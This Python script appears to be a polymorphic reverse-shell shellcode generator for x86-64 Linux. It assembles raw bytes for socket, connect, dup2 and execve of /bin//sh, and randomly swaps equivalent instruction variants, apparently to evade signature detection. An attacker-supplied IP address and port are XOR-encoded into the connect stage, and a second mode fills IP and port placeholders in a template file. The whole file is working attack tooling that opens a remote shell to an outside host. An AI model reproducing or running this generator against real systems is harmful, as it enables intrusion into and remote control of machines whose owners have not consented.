import argparse
import operator
from random import randint

def clean(register):
    if register == "rax":
        values = ["\\x48\\x31\\xC0", "\\xC4\\xE2\\xF8\\xF2\\xC0", "\\x48\\x29\\xC0"]
    if register == "rbx":
        values = ["\\x48\\x31\\xDB", "\\xC4\\xE2\\xE0\\xF2\\xDB", "\\x48\\x29\\xDB"]
    if register == "rcx":
        values = ["\\x48\\x31\\xC9", "\\xC4\\xE2\\xF0\\xF2\\xC9", "\\x48\\x29\\xC9"]
    if register == "rdx":
        values = ["\\x48\\x31\\xD2", "\\xC4\\xE2\\xE8\\xF2\\xD2", "\\x48\\x29\\xD2"]
    if register == "rdi":
        values = ["\\x48\\x31\\xFF", "\\xC4\\xE2\\xC0\\xF2\\xFF", "\\x48\\x29\\xFF"]
    if register == "rsi":
        values = ["\\x48\\x31\\xF6", "\\xC4\\xE2\\xC8\\xF2\\xF6", "\\x48\\x29\\xF6"]
    
    return values[randint(0, len(values)-1)]

def socket():
    values = [
        "\\xB0\\x29\\x6A\\x02\\x5F\\x6A\\x01\\x5E"+clean("rdx")+"\\x0F\\x05\\x49\\x89\\xC1",
        "\\xB0\\x29\\xB3\\x02\\x48\\x89\\xDF\\xB3\\x01\\x48\\x89\\xDE\\x0F\\x05\\x49\\x89\\xC1"]

    return values[randint(0, len(values)-1)]

def connect(ip, port):
    values = ["\\x48\\x97"+clean("rcx")+"\\xBB"+ip+"\\x83\\xF3\\xFF\\x51\\x51\\x53\\x66\\x68"+port+"\\x66\\x6A\\x02\\x48\\x89\\xE6\\x6A\\x10\\x5A\\x48\\x89\\xFB\\xB0\\x2A\\x0F\\x05"]
    return values[randint(0, len(values)-1)]

def dup2():
    values = [
       clean("rax")+clean("rdx")+"\\xB0\\x21\\x4C\\x89\\xCF\\x48\\x31\\xF6\\x0F\\x05"+clean("rax")+clean("rdx")+"\\xB0\\x21\\x4C\\x89\\xCF\\x48\\xFF\\xC6\\x0F\\x05"+clean("rax")+clean("rdx")+"\\xB0\\x21\\x4C\\x89\\xCF\\x48\\xFF\\xC6\\x0F\\x05",
        "\\x6A\\x02\\x5E\\x4C\\x89\\xCF\\x6A\\x21\\x58\\x0F\\x05\\x48\\xFF\\xCE\\x79\\xF6"]

    return values[randint(0, len(values)-1)]

def shell():
    values = [
        "\\x48\\x31\\xD2\\x52\\x52\\x48\\xBB\\x2F\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x53\\x48\\x89\\xE7\\x52\\x57\\x48\\x89\\xE6\\xB0\\x3B\\x0F\\x05",
        clean("rax")+clean("rbx")+"\\x48\\xBB\\x2F\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x50\\x53\\x48\\x89\\xE7\\x50\\x57\\x48\\x89\\xE6\\xB0\\x3B\\x0F\\x05"]

    return values[randint(0, len(values)-1)]

def clean_exit():
    values = ["\\xB0\\x3C\\x0F\\x05"]

    return values[randint(0, len(values)-1)]

def constructor(ip, port):
    shellcode = ""
    shellcode += clean("rax")
    shellcode += clean("rbx")
    shellcode += clean("rcx")
    shellcode += clean("rdx")
    shellcode += clean("rdi")
    shellcode += clean("rsi")
    shellcode += socket()
    shellcode += connect(ip, port)
    shellcode += dup2()
    shellcode += shell()
    shellcode += clean_exit()

    print("Hello your shellcode is "+str(len(shellcode)/4)+" character long !")
    print(shellcode)

    return shellcode

def shellcode_ip_treatment(ip):
    """
    Hex conversion, xor and reverse it
    """
    ip_split = ip.split(".")
    ip_treated = ""
    for i in range(0, 4, 1):
        treating = int(ip_split[i])
        treating = treating^255
        treating = hex(treating)
        treating = str(treating).split("x")[1]
        ip_treated += "\\x"+str(treating)
    
    return ip_treated

def ip_treatment(ip):
    """
    Hex conversion, xor and reverse it
    """
    ip_split = ip.split(".")
    ip_treated = "0x"
    for i in range(3, -1, -1):
        treating = int(ip_split[i])
        treating = treating^255
        treating = hex(treating)
        treating = str(treating).split("x")[1]
        ip_treated += str(treating)
    
    return ip_treated

def shellcode_port_treatment(port):
    """
    Hex conversion, xor
    """
    port_treated = ""
    port = int(port)
    port = hex(port)
    port = str(port).split("x")[1]
    if len(port) != 4:
        print("bad port")
        exit()
    port_part_one = port[2:5]
    port_part_two = port[0:2]
    port_treated += "\\x" + port_part_two + "\\x" + port_part_one

    return port_treated

def port_treatment(port):
    """
    Hex conversion, xor
    """
    port_treated = "0x"
    port = int(port)
    port = hex(port)
    port = str(port).split("x")[1]
    if len(port) != 4:
        print("bad port")
        exit()
    port_part_one = port[2:5]
    port_part_two = port[0:2]
    port_treated += port_part_one + port_part_two

    return port_treated

#def copy_and_modify(version, name, ip, port):

if __name__ == "__main__":

    # Argparse ain't that hard to use
    # You just need to initialize the ArgumentParser
    # You can use the data in the argument later 
    parser = argparse.ArgumentParser()

    # Then initialize the arguments
    parser.add_argument("--construct", "-c", default=False, action="store_true")
    parser.add_argument("--file", "-f", type=str)
    parser.add_argument("--ip-address", "-i", default="127.0.0.1", type=str)
    parser.add_argument("--port", "-p", default="8080", type=str)
    parser.add_argument("--name", "-n", default="reverser_default", type=str)

    # and then parse it
    args = parser.parse_args()


    if args.file and not args.construct:
        with open(args.file, 'r') as f:
            code = f.read()

        ip = ip_treatment(args.ip_address)
        port = port_treatment(args.port)

        code = code.replace("-ip_address-", ip)
        code = code.replace("-port-", port)
        print(code)

    elif not args.file and args.construct:

        ip = shellcode_ip_treatment(args.ip_address)
        port = shellcode_port_treatment(args.port)
        constructor(ip, port)
    else:
        print("You need to set a file to use or ask for the contruct of a shellcode")
        exit(0)
